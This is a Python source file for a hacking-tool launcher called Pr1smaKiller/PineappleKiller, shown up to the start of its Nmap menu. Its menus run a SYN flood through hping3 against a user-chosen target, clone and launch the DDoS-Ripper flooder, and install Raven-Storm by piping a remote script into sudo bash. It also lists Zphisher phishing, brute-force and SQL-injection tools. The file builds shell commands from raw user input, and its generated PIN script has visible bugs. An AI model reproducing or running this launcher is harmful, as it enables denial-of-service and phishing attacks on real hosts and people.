from pineappledev.pineappledev import *
from getpass import getpass
import os
import time
import sys
import random
import string
def pineapplekillerclear():
    try:
        os.system("clear")
    except:
        print("")
pineapplekillerclear()
def pineapplekillerlogo():
    print("""\x1b[38;2;255;0;189mWelcome to \x1b[38;2;0;255;251mPr1smaCol0r \x1b[38;2;255;0;189m| \x1b[38;2;255;0;0mPr1smaKiller \x1b[38;2;0;255;116mv."""+""" \x1b[38;2;255;0;189m| \x1b[38;2;35;0;255m by x04000
\x1b[38;2;127;124;124m
\x1b[38;2;127;124;124m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m┌┐░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
\x1b[38;2;127;124;124m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m┌┘└\x1b[38;2;127;124;124m┐░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
\x1b[38;2;127;124;124m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m┌┘░░\x1b[38;2;127;124;124m└┐░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
\x1b[38;2;127;124;124m░░░░░░░░░░░░░░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m┌┘░░░░\x1b[38;2;127;124;124m└┬\x1b[38;2;255;0;0m────────────────────────────────
\x1b[38;2;127;124;124m░░░░░░░░░░░░░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m┌┘░░░░░░\x1b[38;2;127;124;124m└┬\x1b[38;2;255;0;0m───────────────────────────────
\x1b[38;2;127;124;124m░░░░░░░░░░░░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m┌┘░░░░░░░░\x1b[38;2;127;124;124m└┐░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░
\x1b[38;2;127;124;124m░░░░░░░░░░░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m┌┘░░░░░░░░░░\x1b[38;2;127;124;124m└┬\x1b[38;2;255;243;0m─────────────────────────────
\x1b[38;2;127;124;124m░░░░░░░░░░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m┌┘░░░░░░░░░░░░\x1b[38;2;127;124;124m└┬\x1b[38;2;255;243;0m────────────────────────────
\x1b[38;2;255;255;255m────────────────────────\x1b[38;2;127;124;124m┌┘░░░░░░░░░░░░░░\x1b[38;2;127;124;124m└┐░░░░░░░░░░░░░░░░░░░░░░░░░░░
\x1b[38;2;255;255;255m───────────────────────\x1b[38;2;127;124;124m┬┘░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m└┬\x1b[38;2;12;255;0m──────────────────────────
\x1b[38;2;127;124;124m░░░░░░░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m┌┘░░░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m└┬\x1b[38;2;12;255;0m─────────────────────────
\x1b[38;2;127;124;124m░░░░░░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m┌┘░░░░░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m└┐░░░░░░░░░░░░░░░░░░░░░░░░
\x1b[38;2;127;124;124m░░░░░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m┌┘░░░░░░░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m└┬\x1b[38;2;0;240;255m───────────────────────
\x1b[38;2;127;124;124m░░░░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m┌┘░░░░░░░░░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m└┬\x1b[38;2;0;240;255m──────────────────────
\x1b[38;2;127;124;124m░░░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m┌┘░░░░░░░░░░░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m└┐░░░░░░░░░░░░░░░░░░░░░
\x1b[38;2;127;124;124m░░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m┌┘░░░░░░░░░░░░░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m└┐░░░░░░░░░░░░░░░░░░░░
\x1b[38;2;127;124;124m░░░░░░░░░░░░░░░░\x1b[38;2;127;124;124m─┘──────────────────────────────\x1b[38;2;127;124;124m└─░░░░░░░░░░░░░░░░░░░

\x1b[0;35m
    """)
def slowprint(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(4. / 100)
def nhprogressbar():
    print("[          ]", end='\r')
    time.sleep(0.1)
    print("[■         ]", end='\r')
    time.sleep(0.2)
    print("[■■        ]", end='\r')
    time.sleep(0.4)
    print("[■■■       ]", end='\r')
    time.sleep(0.2)
    print("[■■■■      ]", end='\r')
    time.sleep(0.1)
    print("[■■■■■     ]", end='\r')
    time.sleep(0.5)
    print("[■■■■■■    ]", end='\r')
    time.sleep(0.1)
    print("[■■■■■■■   ]", end='\r')
    time.sleep(0.3)
    print("[■■■■■■■■  ]", end='\r')
    time.sleep(0.2)
    print("[■■■■■■■■■ ]", end='\r')
    time.sleep(0.2)
    print("[■■■■■■■■■■]", end='\r')
    time.sleep(0.5)
def nhprogressbar2():
    for i in enumerate(list(range(10))):
        print("|           ", end='\r')
        time.sleep(0.1)
        print("/           ", end='\r')
        time.sleep(0.1)
        print("-           ", end='\r')
        time.sleep(0.1)
        print("\\           ", end='\r')
        time.sleep(0.1)
    print("Done!", end='\r')
def pineappleframework():
    def pineappleframeworklogo():
        pineappleframeworkmsgr = ""
        pineappleframeworkmsgr = random.randint(0, 9)
        if pineappleframeworkmsgr == 1:
            pineappleframeworkmsg = "Expect the unexpected"
        if pineappleframeworkmsgr == 2:
            pineappleframeworkmsg = "Spoof this secret"
        if pineappleframeworkmsgr == 3:
            pineappleframeworkmsg = "I ❤ Pineapples"
        if pineappleframeworkmsgr == 4:
            pineappleframeworkmsg = "Better security = Better life"
        if pineappleframeworkmsgr == 5:
            pineappleframeworkmsg = "Ocult in the darkness"
        if pineappleframeworkmsgr == 6:
            pineappleframeworkmsg = "Be carefull with the shadows"
        if pineappleframeworkmsgr == 7:
            pineappleframeworkmsg = "This is only a Nightmare"
        if pineappleframeworkmsgr == 8:
            pineappleframeworkmsg = "I see shadows in the darkness"
        if pineappleframeworkmsgr == 9:
            pineappleframeworkmsg = "Close your eyes"
        print("""\x1b[0;35m
╔═╗┬┌┐┌┌─┐┌─┐┌─┐┌─┐┬  ┌─┐╔═╗┬─┐┌─┐┌┬┐┌─┐┬ ┬┌─┐┬─┐┬┌─
╠═╝││││├┤ ├─┤├─┘├─┘│  ├┤ ╠╣ ├┬┘├─┤│││├┤ ││││ │├┬┘├┴┐
╩  ┴┘└┘└─┘┴ ┴┴  ┴  ┴─┘└─┘╚  ┴└─┴ ┴┴ ┴└─┘└┴┘└─┘┴└─┴ ┴ \x1b[0;36mv.1.0
\x1b[0;31m""")
        print(pineappleframeworkmsg)
        print("")
    pineappleframeworklogo()
    slowprint("\x1b[0;36mLoading \x1b[0;31mPineappleFramework\x1b[0;33m.\x1b[0;32m.\x1b[0;34m.\x1b[0;36m")
    nhprogressbar()
    nhprogressbar2()
    pineapplekillerclear()
    pineappleframeworklogo()
    while(True):
        print("\x1b[1;36m┌──[\x1b[1;31mﮊ PineappleFramework\x1b[1;36m]")
        pineappleframeworkoption = str(input("\x1b[1;36m└─$ \x1b[0;31m"))
        print("")

        if pineappleframeworkoption == "exit":
            slowprint("\x1b[0;36mHave a good day :)")
            time.sleep(0.5)
            break
        elif pineappleframeworkoption == "clear":
            pineapplekillerclear()
        elif pineappleframeworkoption == "pflogo":
            pineappleframeworklogo()
        elif pineappleframeworkoption == "help":
            print("""\x1b[1;31m╔═══════════════════════════════════════════════════════╗
\x1b[1;31m║   \x1b[1;36mexit            - Exit the Framework                \x1b[1;31m║
\x1b[1;31m║   \x1b[1;36mclear           - Clear the console                 \x1b[1;31m║
\x1b[1;31m║   \x1b[1;36mpflogo          - Show the logo                     \x1b[1;31m║
\x1b[1;31m║   \x1b[1;36mfilemodifiergui - FileModifier with GUI             \x1b[1;31m║
\x1b[1;31m║   \x1b[1;36mcfile           - Create a file                     \x1b[1;31m║
\x1b[1;31m║   \x1b[1;36mdelfile         - Remove a file                     \x1b[1;31m║
\x1b[1;31m║   \x1b[1;36mrfile           - Read a file                       \x1b[1;31m║
\x1b[1;31m║   \x1b[1;36mwfile           - Write a file                      \x1b[1;31m║
\x1b[1;31m║   \x1b[1;36mgitclone        - Clone a GitRepos                  \x1b[1;31m║
\x1b[1;31m║   \x1b[1;36mpipinstall      - Install a pip module              \x1b[1;31m║
\x1b[1;31m║   \x1b[1;36mpipuninstall    - Uninstall a pip module            \x1b[1;31m║
\x1b[1;31m║   \x1b[1;36mpiplist         - Show pip modules list             \x1b[1;31m║
\x1b[1;31m║   \x1b[1;36mtool.login      - Coming soon                       \x1b[1;31m║
\x1b[1;31m║   \x1b[1;36mtool.logingui   - Coming soon                       \x1b[1;31m║
\x1b[1;31m║   \x1b[1;36mtool.pin        - Coming soon                       \x1b[1;31m║
\x1b[1;31m║   \x1b[1;36mtool.pingui     - Create a script of PIN with GUI   \x1b[1;31m║
\x1b[1;31m╚═══════════════════════════════════════════════════════\x1b[1;31m╝
            """)
        elif pineappleframeworkoption == "filemodifiergui":
            p_filemodifiergui()
        elif pineappleframeworkoption == "cfile":
            nhfilename = str(input("\x1b[0;31mPineappleFramework > Filename \x1b[0;36m#\x1b[0;32m "))
            p_CFILE(nhfilename)
        elif pineappleframeworkoption == "delfile":
            nhfilename = str(input("\x1b[0;31mPineappleFramework > Filename \x1b[0;36m#\x1b[0;32m "))
            p_DELFILE(nhfilename)
        elif pineappleframeworkoption == "rfile":
            nhfilename = str(input("\x1b[0;31mPineappleFramework > Filename \x1b[0;36m#\x1b[0;32m "))
            p_RFILE(nhfilename)
        elif pineappleframeworkoption == "wfile":
            nhfilename = str(input("\x1b[0;31mPineappleFramework > Filename \x1b[0;36m#\x1b[0;32m "))
            nhwrite= str(input("\x1b[0;31mPineappleFramework > Write \x1b[0;36m#\x1b[0;32m "))
            p_WFILE(nhfilename, nhwrite)
        elif pineappleframeworkoption == "gitclone":
            try:
                os.system("sudo apt-get install git")
            except:
                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
            try:
                nhgitclone = str(input("\x1b[0;31mNightmareHunter > URL \x1b[0;36m#\x1b[0;32m "))
                p_gitclone(nhgitclone)
            except:
                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
        elif pineappleframeworkoption == "pipinstall":
            try:
                nhpipinst = str(input("\x1b[0;31mNightmareHunter > Package \x1b[0;36m#\x1b[0;32m "))
                p_pipinstall(nhpipinst)
            except:
                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
        elif pineappleframeworkoption == "pipuninstall":
            try:
                nhpipuninst = str(input("\x1b[0;31mNightmareHunter > Package \x1b[0;36m#\x1b[0;32m "))
                p_pipuninstall(nhpipuninst)
            except:
                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
        elif pineappleframeworkoption == "piplist":
            try:
                p_piplist()
            except:
                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
        elif pineappleframeworkoption == "nodevelopedtool.login":
            try:
                nhpdusername = str(input("\x1b[0;31mNightmareHunter > Username \x1b[0;36m#\x1b[0;32m "))
                nhpdpassword = getpass("\x1b[0;31mNightmareHunter > Package \x1b[0;36m#\x1b[0;32m ")
                p_login(nhpdusername, nhpdpassword)
            except:
                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
        elif pineappleframeworkoption == "nodevelopedtool.logingui":
            try:
                nhpdusername = str(input("\x1b[0;31mNightmareHunter > Username \x1b[0;36m#\x1b[0;32m "))
                nhpdpassword = getpass("\x1b[0;31mNightmareHunter > Package \x1b[0;36m#\x1b[0;32m ")
                p_logingui(nhpdusername, nhpdpassword)
            except:
                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
        elif pineappleframeworkoption == "nodevelopedtool.pin":
            try:
                nhpdpin = getpass("\x1b[0;31mNightmareHunter > Pin \x1b[0;36m#\x1b[0;32m ")
                p_pin_noint(nhpdpin)
            except:
                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
        elif pineappleframeworkoption == "tool.pingui":
            try:
                user = os.getenv('USER')
                host = os.getenv('HOST')
                red = '\x1b[31m'
                cyan = '\x1b[36m'
                end = '\x1b[0m'
                pfpin = getpass(f'{cyan}{user}{end}@{cyan}{host}{red} ❯ ')
                if pfpin == pfpin:
                    if os.path.isfile("PFPinGUI.py"):
                        print("\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] The file alredy exists!")
                        time.sleep(2)
                    else:
                        f=open("PFPinGUI.py", "w")
                        f.write("""
pineappledevpin = """+str(pfpin)+"""
global pineappledevpinpassed
pineappledevpinpassed = 0
try:
    import tkinter
    from tkinter import messagebox

    pin = tkinter.Tk()
    pin.geometry("400x300")
    pin.title("PineappleDev Login")
    pin.configure(bg="black")

    text1 = tkinter.Label(pin, text = "PineappleDev Login", bg="blue", fg="white")
    text1.pack(fill = tkinter.X)
    text2 = tkinter.Label(pin, text = "", bg="black", fg="white")
    text2.pack(fill = tkinter.X)
    text3 = tkinter.Label(pin, text = "Username", bg="black", fg="white")
    text3.pack(fill = tkinter.X)

    input1 = tkinter.Entry(pin, show="*", width = 50, fg="white", bg="black")
    input1.pack()

    text4 = tkinter.Label(pin, text = "", bg="black", fg="white")
    text4.pack(fill = tkinter.X)

    def pineappledevpinf():
        pineappledevpininput = input1.get()
        if str(pineappledevpininput) == str(pineappledevpin):
            global pineappledevpinpassed
            pineappledevpinpassed = 1
            text4.configure(text="The PIN is correct!", fg="green")
            pin.destroy()
        else:
                ext4.configure(text="Incorrect PIN!", fg="red")
                
            
    pinbutton = tkinter.Button(pin, text = "Enter", command = pineappledevpinf, fg="white", bg="black")
    pinbutton.pack()

    text5 = tkinter.Label(pin, text = "", bg="black", fg="white")
    text5.pack(fill = tkinter.X)

    def pineappledevexit():
        global pineappledevpinpassed
        pineappledevpinpassed = 2
        exit()

    pinexitbutton = tkinter.Button(pin, text = "Exit", command = pineappledevexit, fg="white", bg="black")
    pinexitbutton.pack()

    pin.mainloop()
except:
    print("\nPineappleDev > Keyboard interruption")
if pineappledevpinpassed == 1:
    print("PineappleDev > The PIN is correct!")
elif pineappledevpinpassed == 2:
    print("PineappleDev > Program aborted")
    exit()
else:
    return p_pingui(pineappledevpin)
                        """)
                        f.close()
                        print("The script saved in: PFPinGUI.py")
                else:
                    print("\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] This is not a valid number!")
            except:
                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
        else:
            print("\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Unknown command")

pineapplekillerlogo()
try:
    print("Do you want to check the updates of Pr1smaKiller? [Y/n]")
    pineapplekilleroption = str(input("\x1b[0;31mPr1smaKiller > \x1b[0;32m"))
    if pineapplekilleroption == "Y" or pineapplekilleroption == "y":
        slowprint("Checking updates...")
        try:
            os.system("wget https://raw.githubusercontent.com/x04000/Pr1smaKiller/main/pr1smakiller/version")
            with open("version","r") as file:
                    for line in file:
                        lastestversion = line
            with open("pr1smakiller/version","r") as file1:
                    for line1 in file1:
                        currentversion = line1
            os.system("rm version")
            time.sleep(2)
            if currentversion < lastestversion:
                print("Pr1smaKiller is not updated!")
                print("You version is "+currentversion+" and the lastest is "+lastestversion+"!")
                print("")
                print("Do you want to update Pr1smaKiller? [Y/n]")
                pineapplekilleroption = str(input("\x1b[0;31mPr1smaKiller > \x1b[0;32m"))
                if pineapplekilleroption == "Y" or pineapplekilleroption == "y":
                    try:
                        os.system("python3 pr1smakiller/Pr1smaUpdater.py")
                    except:
                        print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                elif pineapplekilleroption == "N" or pineapplekilleroption == "n":
                    slowprint("Skipped Pr1smaKiller Updater")
                    time.sleep(0.5)
                else:
                    slowprint("\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Invalid option")
                    time.sleep(0.5)
        except:
            print("PineappleKiller > A error ocurred during module installation!")
            exit()
    elif pineapplekilleroption == "N" or pineapplekilleroption == "n":
        slowprint("Check of modules skipped")
        time.sleep(0.5)
    else:
        slowprint("\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Invalid option")
        time.sleep(0.5)
    pineapplekillerclear()
    pineapplekillerlogo()
    slowprint("\x1b[0;36mLoading \x1b[0;31mPineappleKiller\x1b[0;33m.\x1b[0;32m.\x1b[0;34m.\x1b[0;36m")
    nhprogressbar()
    nhprogressbar2()
    time.sleep(1)
except:
    print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
    exit()
try:
    print("Do you want to check modules (Installation and update)? [Y/n]")
    pineapplekilleroption = str(input("\x1b[0;31mPr1smaKiller > \x1b[0;32m"))
    if pineapplekilleroption == "Y" or pineapplekilleroption == "y":
        slowprint("Installing modules...")
        try:
            os.system("sudo apt-get install wget")
            os.system("sudo apt-get install git")
            os.system("sudo apt-get install hping3")
            os.system("sudo apt-get install etherape")
            os.system("sudo apt-get install metasploit-framework")
            os.system("sudo apt-get install wireshark")
            os.system("sudo apt-get install nmap")
            os.system("sudo apt-get install python3-tk")
            time.sleep(2)
        except:
            print("PineappleKiller > A error ocurred during module installation!")
            exit()
    elif pineapplekilleroption == "N" or pineapplekilleroption == "n":
        slowprint("Check of modules skipped")
        time.sleep(0.5)
    else:
        slowprint("\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Invalid option")
        time.sleep(0.5)
    pineapplekillerclear()
    pineapplekillerlogo()
    slowprint("\x1b[0;36mLoading \x1b[0;31mPineappleKiller\x1b[0;33m.\x1b[0;32m.\x1b[0;34m.\x1b[0;36m")
    nhprogressbar()
    nhprogressbar2()
    time.sleep(1)
except:
    print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
    exit()
def pineapplekillermenu():
    try:
        while(True):
            os.system("clear")
            pineapplekillerlogo()
            print("""
███▄ ▄███▓▓█████  ███▄    █  █    ██ 
▓██▒▀█▀ ██▒▓█   ▀  ██ ▀█   █  ██  ▓██▒
▓██    ▓██░▒███   ▓██  ▀█ ██▒▓██  ▒██░
▒██    ▒██ ▒▓█  ▄ ▓██▒  ▐▌██▒▓▓█  ░██░
▒██▒   ░██▒░▒████▒▒██░   ▓██░▒▒█████▓ 
░ ▒░   ░  ░░░ ▒░ ░░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ 
░  ░      ░ ░ ░  ░░ ░░   ░ ▒░░░▒░ ░ ░ 
░      ░      ░      ░   ░ ░  ░░░ ░ ░ 
    ░      ░  ░         ░    ░     

    \x1b[38;2;0;240;255m╔═════════════════════════════════════════════════════════╗
    \x1b[38;2;0;240;255m║\x1b[0;31m[\x1b[0;36m00\x1b[0;31m] \x1b[0;32mExit               \x1b[0;31m[\x1b[0;36m08\x1b[0;31m] \x1b[0;32mMetasploit                  \x1b[38;2;0;240;255m║
    \x1b[38;2;0;240;255m║\x1b[0;31m[\x1b[0;36m01\x1b[0;31m] \x1b[0;32mPineappleFramework \x1b[0;31m[\x1b[0;36m09\x1b[0;31m] \x1b[0;32mFile modifier               \x1b[38;2;0;240;255m║
    \x1b[38;2;0;240;255m║\x1b[0;31m[\x1b[0;36m02\x1b[0;31m] \x1b[0;32mDoS                \x1b[0;31m[\x1b[0;36m10\x1b[0;31m] \x1b[0;32mBruteForce                  \x1b[38;2;0;240;255m║
    \x1b[38;2;0;240;255m║\x1b[0;31m[\x1b[0;36m03\x1b[0;31m] \x1b[0;32mDDoS               \x1b[0;31m[\x1b[0;36m11\x1b[0;31m] \x1b[0;32mZphisher                    \x1b[38;2;0;240;255m║
    \x1b[38;2;0;240;255m║\x1b[0;31m[\x1b[0;36m04\x1b[0;31m] \x1b[0;32mTrafic view        \x1b[0;31m[\x1b[0;36m12\x1b[0;31m] \x1b[0;32mSherlock                    \x1b[38;2;0;240;255m║
    \x1b[38;2;0;240;255m║\x1b[0;31m[\x1b[0;36m05\x1b[0;31m] \x1b[0;32mPing               \x1b[0;31m[\x1b[0;36m13\x1b[0;31m] \x1b[0;32mKahoot Tools                \x1b[38;2;0;240;255m║
    \x1b[38;2;0;240;255m║\x1b[0;31m[\x1b[0;36m06\x1b[0;31m] \x1b[0;32mNmap               \x1b[0;31m[\x1b[0;36m14\x1b[0;31m] \x1b[0;32mJS-InjectionPineappleKiller \x1b[38;2;0;240;255m║
    \x1b[38;2;0;240;255m║\x1b[0;31m[\x1b[0;36m07\x1b[0;31m] \x1b[0;32mSqlMap                                              \x1b[38;2;0;240;255m║
    \x1b[38;2;0;240;255m╚═════════════════════════════════════════════════════════╝
            """)
            pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
            if str(pineapplekilleroption) == "00":
                print("\x1b[0;31mPineappleKiller > \x1b[0;36mHave a good day :)")
                break
            if str(pineapplekilleroption) == "01":
                time.sleep(0.5)
                pineapplekillerclear()
                pineappleframework()
            if str(pineapplekilleroption) == "02":
                pineapplekillerclear()
                pineapplekillerlogo()
                print("""[DoS]

\x1b[0;31m[\x1b[0;36m00\x1b[0;31m] \x1b[0;32mExit
\x1b[0;31m[\x1b[0;36m01\x1b[0;31m] \x1b[0;32mHping3
                """)
                pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                if str(pineapplekilleroption) == "00":
                    print("")
                if str(pineapplekilleroption) == "01":
                    pineapplekillersettedtarget = 0
                    pineapplekillertarget = ""
                    pineapplekillerport = "80"
                    while(True):
                        pineapplekillerclear()
                        pineapplekillerlogo()
                        print("""\x1b[0;36m[PineappleKiller DoS Hping3]

\x1b[0;36mtarget      \x1b[0;31m- \x1b[0;32mDefine target Host
\x1b[0;36mport        \x1b[0;31m- \x1b[0;32mDefine port
\x1b[0;36mattack      \x1b[0;31m- \x1b[0;32mStart attack
                        """)
                        pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                        print("")
                        if str(pineapplekilleroption) == "attack":
                            if pineapplekillersettedtarget == 1:
                                pineapplekillerclear()
                                pineapplekillerlogo()
                                print("[\x1b[0;36mPineappleKiller DoS Hping3 \x1b[0;31mAttacking]\x1b[0;36m")
                                try:
                                    pineapplekillerdoscommand = "sudo hping3 -p "+pineapplekillerport+" -S --flood "+pineapplekillertarget
                                    os.system(pineapplekillerdoscommand)
                                    time.sleep(5)
                                except:
                                    print("")
                            else:
                                print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Undefined target!")
                        if str(pineapplekilleroption) == "target":
                            print("[Target]")
                            pineapplekillertarget = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                            pineapplekillersettedtarget = 1
                            print("")
                            print("Target set to: "+pineapplekillertarget)
                            time.sleep(2)
                        if str(pineapplekilleroption) == "port":
                            print("[Port]")
                            pineapplekillerport = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
            if str(pineapplekilleroption) == "03":
                pineapplekillerclear()
                pineapplekillerlogo()
                print("""
\x1b[0;31m[\x1b[0;36m00\x1b[0;31m] \x1b[0;32mExit
\x1b[0;31m[\x1b[0;36m01\x1b[0;31m] \x1b[0;32mDDoS-Ripper
\x1b[0;31m[\x1b[0;36m02\x1b[0;31m] \x1b[0;32mRaven-Storm
                """)
                pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                if str(pineapplekilleroption) == "00":
                    print("")
                if str(pineapplekilleroption) == "01":
                    pineapplekillerclear()
                    pineapplekillerlogo()
                    print("Checking panel installation...")
                    def pineapplekillercheckdripper():
                        def pineapplekillerdripperinst():
                            pineapplekillerclear()
                            pineapplekillerlogo()
                            print("The panel is not installed!")
                            print("Do you want to install them? [Y/n]")
                            pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                            if str(pineapplekilleroption) == "Y":
                                if os.path.isdir("DDoS-Ripper"):
                                    os.system("sudo rm -rfv DDoS-Ripper")
                                print("")
                                print("Downloading panel > Via Github")
                                try:
                                    os.system("git clone https://github.com/palahsu/DDoS-Ripper")
                                    time.sleep(2)
                                    return pineapplekillercheckdripper()
                                except:
                                    print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                            else:
                                print("")
                        if os.path.isdir("DDoS-Ripper"):
                            if os.path.isfile("DDoS-Ripper/DRipper.py"):
                                pineapplekillersettedtarget = 0
                                pineapplekillertarget = ""
                                pineapplekillerport = "80"
                                pineapplekillerturbo = "135"
                                pineapplekillerquiet = "0"
                                while(True):
                                    pineapplekillerclear()
                                    pineapplekillerlogo()
                                    print("""\x1b[0;36m[PineappleKiller DDoS Ripper]

\x1b[0;36mtarget      \x1b[0;31m- \x1b[0;32mDefine target Host
\x1b[0;36mport        \x1b[0;31m- \x1b[0;32mDefine port
\x1b[0;36mturbo       \x1b[0;31m- \x1b[0;32mSet turbo (135-443)
\x1b[0;36mquiet       \x1b[0;31m- \x1b[0;32mSet quiet mode
\x1b[0;36mattack      \x1b[0;31m- \x1b[0;32mStart attack
                                    """)
                                    pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                                    print("")
                                    if str(pineapplekilleroption) == "attack":
                                        if pineapplekillersettedtarget == 1:
                                            pineapplekillerclear()
                                            pineapplekillerlogo()
                                            print("[\x1b[0;36mPineappleKiller DDoS Ripper \x1b[0;31mAttacking]\x1b[0;36m")
                                            try:
                                                pineapplekillerparameters = "-s "+pineapplekillertarget+" -p "+pineapplekillerport+" -t "+pineapplekillerturbo
                                                if pineapplekillerquiet == "1":
                                                    pineapplekillerparameters = pineapplekillerparameters+" -q"
                                                pineapplekillerddosrippercommand = "cd DDoS-Ripper && python3 DRipper.py "+pineapplekillerparameters+" && cd .."
                                                os.system(pineapplekillerddosrippercommand)
                                                time.sleep(1)
                                            except:
                                                print("")
                                        else:
                                            print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Undefined target!")
                                    if str(pineapplekilleroption) == "target":
                                        print("[Target]")
                                        pineapplekillertarget = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                                        pineapplekillersettedtarget = 1
                                        print("")
                                        print("Target set to: "+pineapplekillertarget)
                                        time.sleep(2)
                                    if str(pineapplekilleroption) == "port":
                                        print("[Port]")
                                        pineapplekillerport = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                                    if str(pineapplekilleroption) == "turbo":
                                        print("[Turbo]")
                                        pineapplekillerturbo = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                                    if str(pineapplekilleroption) == "quiet":
                                        if str(pineapplekillerquiet) == "0":
                                            pineapplekillerquiet = 1
                                        if str(pineapplekillerquiet) == "1":
                                            pineapplekillerquiet = 0
                            else:
                                pineapplekillerdripperinst()
                        else:
                            pineapplekillerdripperinst()
                    pineapplekillercheckdripper()
                if str(pineapplekilleroption) == "02":
                    pineapplekillerclear()
                    pineapplekillerlogo()
                    print("Do you want to install the panel? [Y/n]")
                    pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                    if pineapplekilleroption == "Y":
                        pineapplekillerclear()
                        pineapplekillerlogo()
                        print("Installing Raven Storm...")
                        try:
                            os.system("curl -s https://raw.githubusercontent.com/Taguar258/Raven-Storm/master/install.sh | sudo bash -s")
                            print("PineappleKiller > Installed!")
                        except:
                            print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")
                    else:
                        try:
                            os.system("sudo rst")
                        except:
                            print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")

            if str(pineapplekilleroption) == "04":
                pineapplekillerclear()
                pineapplekillerlogo()
                print("""[Trafic view]

\x1b[0;31m[\x1b[0;36m00\x1b[0;31m] \x1b[0;32mExit
\x1b[0;31m[\x1b[0;36m01\x1b[0;31m] \x1b[0;32mEtherape
\x1b[0;31m[\x1b[0;36m02\x1b[0;31m] \x1b[0;32mWireshark
                """)
                pineapplekilleroption = input("\x1b[0;31mPineappleKiller > \x1b[0;32m")
                if str(pineapplekilleroption) == "00":
                    print("")
                if str(pineapplekilleroption) == "01":
                    try:
                        os.system("sudo etherape")
                    except:
                        print("")
                if str(pineapplekilleroption) == "02":
                    try:
                        os.system("wireshark")
                    except:
                        print("")

            if str(pineapplekilleroption) == "05":
                pineapplekillerclear()
                pineapplekillerlogo()
                pineapplekillerhost = input("\x1b[0;31mPineappleKiller \x1b[0;36mHost\x1b[0;31m> \x1b[0;32m")
                try:
                    pineapplekillerping = "ping "+pineapplekillerhost
                    os.system(pineapplekillerping)
                    time.sleep(5)
                except:
                    print("\n\x1b[0;31m[\x1b[0;36m!\x1b[0;31m] Keyboard interrupt")

            if str(pineapplekilleroption) == "06":
                while(True):
                    pineapplekillerclear()
                    pineapplekillerlogo()
                    print("\x1b[0;31m[\x1b[0;36mNmap\x1b[0;31m]")
                    print("""
    \x1b[0;31m[\x1b[0;36m00\x1b[0;31m] \x1b[0;32mExit
    \x1b[0;31m[\x1b[0;36m01\x1b[0;31m] \x1b[0;32mPing sweep
    \x1b[0;31m[\x1b[0;36m02\x1b[0;31m] \x1b[0;32mPort open map
    \x1b[0;31m[\x1b[0;36m03\x1b[0;31m] \x1b[0;32mFull port and mac map
    \x1b[0;31m[\x1b[0;36m04\x1b[0;31m] \x1b[0;32mSO and Version map
                    """)
